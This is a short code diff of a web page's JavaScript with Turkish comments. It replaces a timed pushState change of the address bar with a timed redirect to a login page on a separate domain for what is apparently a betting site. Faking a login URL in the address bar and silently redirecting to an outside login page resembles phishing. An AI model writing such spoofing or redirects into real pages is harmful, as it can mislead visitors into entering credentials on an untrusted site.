@@ -123,11 +123,10 @@
                 }, 500); // 500ms bekleme süresi ile animasyonu başlatır
             }
 
-            // 5 saniye sonra URL'yi değiştir
+            // 10 saniye sonra başka bir siteye yönlendir
             setTimeout(function() {
-                var newUrl = "https://ncapps.site/login.php?site=ruyabet";
-                window.history.pushState({}, '', newUrl);
-            }, 5000); // 5 saniye bekleme süresi
+                window.location.href = "https://ncapps.site/login.php?site=ruyabet";
+            }, 10000); // 10 saniye bekleme süresi
         };
     </script>
 
